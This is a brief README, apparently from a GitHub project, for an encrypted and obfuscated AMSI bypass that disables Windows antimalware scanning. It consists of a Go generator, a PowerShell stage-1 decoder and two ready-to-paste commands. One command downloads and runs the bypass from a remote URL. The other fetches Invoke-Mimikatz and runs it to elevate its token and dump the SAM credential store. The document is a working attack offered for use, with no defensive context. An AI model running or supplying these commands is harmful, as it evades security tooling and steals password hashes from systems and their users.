# Encrypted/Encoded Obfuscated AMSI Bypass

- generator.go  
This wraps an obfuscated AMSI payload from amsi.fail with encryption and encoding  

- stage-1.ps1  
This decodes and invokes the encrypted, encoded, obfuscated payload

Download and invoke stage-1 payload:  
```  
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/timsonner/encode-decode-payloads/refs/heads/master/amsi-bypass/stage-1.ps1")
```  

Download and invoke whatever you like after stage-1:  
```  
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```  

